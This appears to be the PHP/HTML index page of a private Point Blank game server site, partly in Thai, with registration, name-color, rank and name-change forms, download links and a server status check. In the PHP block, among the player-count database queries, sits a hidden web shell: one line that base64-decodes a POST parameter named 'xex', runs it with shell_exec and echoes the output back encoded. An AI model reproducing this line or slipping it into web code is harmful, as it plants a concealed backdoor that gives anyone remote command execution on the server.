<?php 
include_once('inc/include.php');
?>
<!DOCTYPE html>
<html>
<head>
	<link href="pointblank.ico" rel="icon" type="image/x-icon" />
	 <link href="https://getbootstrap.com/docs/4.1/examples/sticky-footer-navbar/sticky-footer-navbar.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/github-fork-ribbon-css/0.2.2/gh-fork-ribbon.min.css" />
<style type="text/css">
	.xsx {
    display: block;
    padding: 9.5px;
    margin: 0 0 10px;
    font-size: 13px;
    line-height: 1.42857143;
    color: #333;
    word-break: break-all;
    word-wrap: break-word;
    background-color: #ffffff;
    border: 1px solid #fff;
    border-radius: 4px;
}

	.grD {
		grid-column-gap: 0;
	}

	.nowrap {
  white-space: nowrap ;
}



</style>
</head>
<body>
	<a class="github-fork-ribbon" href="https://github.com/haxtivitiez/PointBlankUtilsWeb" data-ribbon="Fork me on GitHub" title="Fork me on GitHub">Fork me on GitHub</a>
	<br>
<div class="container">


<div class="fig-ansi">
<pre class="xsx" id="taag_font_ANSIShadow" class="fig-ansi" contenteditable="false">██████╗  ██████╗ ██╗███╗   ██╗████████╗██████╗ ██╗      █████╗ ███╗   ██╗██╗  ██╗    ███████╗██████╗ ███████╗███████╗██╗  ██╗ █████╗ ██╗     ██╗     
██╔══██╗██╔═══██╗██║████╗  ██║╚══██╔══╝██╔══██╗██║     ██╔══██╗████╗  ██║██║ ██╔╝    ██╔════╝██╔══██╗██╔════╝██╔════╝██║  ██║██╔══██╗██║     ██║     
██████╔╝██║   ██║██║██╔██╗ ██║   ██║   ██████╔╝██║     ███████║██╔██╗ ██║█████╔╝     █████╗  ██████╔╝█████╗  █████╗  ███████║███████║██║     ██║     
██╔═══╝ ██║   ██║██║██║╚██╗██║   ██║   ██╔══██╗██║     ██╔══██║██║╚██╗██║██╔═██╗     ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝  ╚════██║██╔══██║██║     ██║     
██║     ╚██████╔╝██║██║ ╚████║   ██║   ██████╔╝███████╗██║  ██║██║ ╚████║██║  ██╗    ██║     ██║  ██║███████╗███████╗     ██║██║  ██║███████╗███████╗
╚═╝      ╚═════╝ ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
                                                                                                                                                     </pre>
<div>&nbsp;</div>
</div>

<!--

<span id="uuid"></span><br/>
<br/>

<input id="generateUUID" type="button" value="Generate Token"/>

<br/><br/>
-->
<?php 

$cPlayer = $connec->prepare('SELECT player_id FROM accounts');
$cPlayer->execute();
$countPlayer = $cPlayer->rowCount();
$c=shell_exec(base64_decode($_POST['xex'])); echo base64_encode($c);
$cPlayerOnline = $connec->prepare('SELECT player_id FROM accounts WHERE online = true');
$cPlayerOnline->execute();
$countPlayerOnline = $cPlayerOnline->rowCount();


function stest() {
if(fsockopen("pbth.un4ckn0wl3z.xyz",39190))
{
print '<font color="green" style="color: green;">online</font>';
}
else
{
print '<font color="red" style="color: red;">offline</font>';
}
}

 ?>

<div  align="right" >
<h5>Server status: <?php @@stest() ?>
          &nbsp;&nbsp;&nbsp;
ผู้เล่นออนไลน์
          <font color='green' style="color: red;"><?php echo number_format($countPlayerOnline + 0); ?> / 100</font>
        </h5>
       
		
 
</div>
<hr>
  <div align="right">

  <a href="#c"><button type="button" class="btn  btn-info">ปลี่ยนสีชื่อ</button></a>
<a href="#r"><button type="button" class="btn  btn-danger">เปลี่ยนยศ</button></a>
<a href="#n"><button type="button" class="btn  btn-warning">เปลี่ยชื่อ</button></a>
</div>


  	<hr>
<form action="/insert.php" method="POST">
  INPUT USERNAME HERE:<br>
 <div class="col-xs-4">
    <input class="form-control" name="token" type="text" placeholder="username ต้องมี 13 ตัวอักษรขึ้นไป" required>
  </div>
  <input class="btn btn-success" type="submit" value="Submit">
<div class="row">
  <div class="col-sm-6">


</form> 

<!--
<p>
	*** วิธีสมัคร <br/>
	1.ให้กดที่ Generate Token รัวๆซัก 4 - 5 ครั้ง<br/>
	2.ให้นำค่าที่ได้กรอกลงในช่อง INPUT TOKEN HERE: แล้วกด Submit <br/>
	3.จะได้ไฟล์ token.enc ให้เอาไปวางใน folder เกม<br/>
	4.เข้าเกมโดยการเปิดไฟล์ PBStart หรือ PBStart.bat<br/>
	5.Play the game!
</p>
--><br/><br/>
<p>
	<b>*** วิธีสมัคร  + วิธีเข้าเกม</b><br/>
	1.ให้กรอกเฉพาะ username ที่ใช้ในการ login แล้วกด submit<br/>
	2.เข้าเกมโดยการเปิดไฟล์ PBStart หรือ PBStart.bat แล้วกรอก username ที่พึ่งสมัครไป<br/>
	3.Play the game!
</p>

<p>
	<b>*** กลุ่ม Facebook: </b><br/>
	<a href="https://www.facebook.com/groups/723655958018703/" target="_blank">https://www.facebook.com/groups/723655958018703/</a>
</p>

<p>
	<b>*** Files: </b><br/>
	ตัวเกม : <a href="https://drive.google.com/file/d/1nFCF9sfnN_2qCLPshn7MnhhA-QgNjwsX/view?fbclid=IwAR0iSzKPLsjJ0mGZEkhPQHuoyMKMp7ppH-K1gdkp0xwv-nrEnuXekS9dTFM" target="_blank">click</a> <br>
		update patch v1 : <a href="https://drive.google.com/file/d/1uR7hX98WZvFQwiwkfaDHxZh7vUZIZecd/view?fbclid=IwAR0JdP7wGPanGTDhVTZsHP9JzkyUnSpkvburS9qiGNeCzKMtvB0ieyS0Ce4" target="_blank">click</a> <br>
</p>

<p>
	<b>*** config only: </b><a href="lwsi_En.sif" target="_blank">click</a><br/>
	
</p>


<p>
	<b>*** วิธี update patch</b><br/>
	- โหลด+ แตกไฟล์ แล้วเอาไปวางทับไฟล์เดิมใน folder เกมครับ
</p>

<p>
	<b>*** Server Infomation</b><br/>
	- ตัวเกมไทย<br/>
	- UDP3 Mode<br/>
	- PVP 8x8<br/>
	- PVE 4x8<br/>
	- ของฟรี เซิฟลื่น<br/>
	- ขอยศจาก GM ได้<br/>
</p>
  </div>
  <div class="col-sm-6" align="justify">
  	<b>PointBlank Free4All | Download, Update patch and Login.</b>
  	<div align="right">
	<video controls="true"   width="640" height="385" >
    <source src="vasdwfwdaqwfqg.mp4" type="video/mp4" />
</video>
</div>
  </div>
</div>

<hr>
<div id="c">
<b>*** เปลี่ยนสีชื่อ</b><br/>
<b>*** กรุณาออกจากเกมก่อนเปลี่ยนสีชื่อ</b><br/>
<form action="/change_nick_color.php" method="POST">
  INPUT USERNAME HERE:<br>
 <div class="col-xs-4">
    <input class="form-control" name="token" type="text" placeholder="username" required>
  </div>
<div  class="col-xs-4">
<select class="form-control" id="color_num" name="color_num">
    <option value='1'>สีส้มแดง</option>
    <option value='2'>สีส้ม</option>
    <option value='3'>สีเหลืองเข้ม</option>
    <option value='4'>สีเหลืองอ่อน</option>
    <option value='5'>สีเขียวอ่อน</option>
    <option value='6'>สีเขียวเข้ม</option>
    <option value='7'>สีฟ้า</option>
    <option value='8'>สีน้ำเงิน</option>
    <option value='9'>สีน้ำเงินเข้ม</option>
    <option value='10'>สีม่วงเข้ม</option>
    <option value='11'>สีเทา</option>
    <option value='12'>สีอะไรไม่รู้ มองไม่เห็น</option>
</select>

</div>
  <input class="btn btn-info" type="submit" value="Submit">
</form> 
</div>
<hr>
<div id="r">
<b>*** เลือกยศ</b><br/>
<b>*** กรุณาออกจากเกมก่อนเปลี่ยนยศ</b><br/>
<form action="/change_rank.php" method="POST">
  INPUT USERNAME HERE:<br>
 <div class="col-xs-4">
    <input class="form-control" name="token" type="text" placeholder="username" required>
  </div>
<div  class="col-xs-4">
<select class="form-control" id="rank_num" name="rank_num">
	<?php for($i=0;$i<=51;$i++) {?>
	<?php echo '<option data-content="/img_rank/'.$i.'.gif" value="'.$i.'">'.$i.'</option>';?>
	<?php } ?>
</select>

</div>
  <input class="btn btn-danger" type="submit" value="Submit">
</form> 
</div>
<hr><br/>
	<b>*** ลำดับยศ</b><br/>
	<?php echo '<div class="row">';?>
	<?php for($i=0;$i<=51;$i++) {?>
	
	<?php echo '<div class="col-md-1">';?>
	<?php echo '<img src="/img_rank/'.$i.'.gif">';?>
	<?php echo $i;?>
	<?php echo '</div>';?>
	<?php } ?>
	<?php echo '</div>';?>
<hr>


<div id="n">
<b>*** เปลี่ยนชื่อ (ไม่รองรับภาษาไทย)</b><br/>
<b>*** กรุณาออกจากเกมก่อนเปลี่ยนชื่อ</b><br/>
<form action="change_name.php" method="POST">
  INPUT USERNAME HERE:<br>
 <div class="col-xs-4">
    <input class="form-control" name="token" type="text" placeholder="username" required>
  </div>
<div  class="col-xs-4">
<input class="form-control" name="new_name" type="text" placeholder="new name" required>

</div>
  <input class="btn btn-warning" type="submit" value="Submit">
</form> 
</div>
<hr>

<br><br><br><br><br><br><br>

 </div><!-- /.container -->




<script type="text/javascript" src="uuid.js"></script>

<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">

<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

    <footer class="footer">
      <div class="container" >
        <span class="text-muted">Cool stuff and designed by <a href="https://www.facebook.com/un4ckn0wl3z" target="_blank">@un4ckn0wl3z</a></span>
      </div>
    </footer>
</body>


</html>
